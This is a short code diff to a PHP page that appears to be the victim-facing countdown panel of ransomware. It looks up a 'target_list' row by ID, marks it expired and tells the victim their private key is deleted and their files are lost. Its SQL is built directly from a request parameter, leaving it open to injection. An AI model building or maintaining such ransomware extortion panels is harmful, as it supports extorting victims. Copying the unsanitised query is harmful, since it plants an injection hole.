@@ -27,13 +27,10 @@ if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
    if ($result->num_rows > 0) {
       while ($row = $result->fetch_assoc()) {
             if ($row['time_left'] < "00:00:01") {
-               echo "$('#form_div').hide();" . "\n";
-               echo "$('#what_happened').hide();" . "\n";
-
-               $sql1 = "UPDATE target_list SET time_expired=\"1\" where unique_id = \"$targetID\"";
+               $sql1 = "UPDATE target_list SET time_expired=\"1\" where unique_id = \"$uniqueID\"";
                $result1 = $conn->query($sql1);
 
-               if ($result->num_rows > 0) {
+               if ($result1->num_rows >= 0) {
                   echo "<center>";
                   echo "<font color=\"red\">";
                   echo "<h3>Time expired, your associated private key has been deleted and your files forever lost!</h3>";
@@ -58,3 +55,6 @@ if (isset($_GET['unique_id']) && !empty($_GET['unique_id'])) {
 $conn->close();
 
 ?>
+
+  </body>
+</html>
